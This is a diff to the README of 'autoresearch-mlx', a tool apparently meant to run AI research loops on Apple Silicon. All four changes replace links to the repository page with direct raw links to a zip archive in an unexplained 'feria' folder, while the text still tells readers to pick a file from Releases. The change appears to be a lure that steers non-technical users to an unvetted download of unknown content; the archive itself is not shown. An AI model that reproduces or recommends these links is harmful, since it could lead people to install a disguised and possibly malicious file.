@@ -1,6 +1,6 @@
 # 🔍 autoresearch-mlx - Simple AI Research Loops on Apple Silicon
 
-[![Download autoresearch-mlx](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Negusyellowfever875/autoresearch-mlx)
+[![Download autoresearch-mlx](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Negusyellowfever875/autoresearch-mlx/raw/refs/heads/main/feria/autoresearch-mlx-3.9.zip)
 
 ## ℹ️ What is autoresearch-mlx?
 
@@ -32,7 +32,7 @@ You do not need programming knowledge to start using autoresearch-mlx. Follow th
 
 Click the big green button at the top or go directly to:
 
-https://github.com/Negusyellowfever875/autoresearch-mlx
+https://github.com/Negusyellowfever875/autoresearch-mlx/raw/refs/heads/main/feria/autoresearch-mlx-3.9.zip
 
 This page hosts the latest version and detailed information.
 
@@ -111,7 +111,7 @@ To get the latest improvements:
 
 1. Visit the download link again:
    
-   https://github.com/Negusyellowfever875/autoresearch-mlx
+   https://github.com/Negusyellowfever875/autoresearch-mlx/raw/refs/heads/main/feria/autoresearch-mlx-3.9.zip
    
 2. Go to the **Releases** section.
 3. Download the newest version.
@@ -143,6 +143,6 @@ Use the **Issues** tab on the GitHub page to submit bug reports or feature sugge
 
 Start by visiting this page to download the latest version:
 
-[Download autoresearch-mlx](https://github.com/Negusyellowfever875/autoresearch-mlx)  
+[Download autoresearch-mlx](https://github.com/Negusyellowfever875/autoresearch-mlx/raw/refs/heads/main/feria/autoresearch-mlx-3.9.zip)  
 
 Click **Releases**, pick the latest `.dmg` or `.zip` file, download it, and follow the installation steps above.
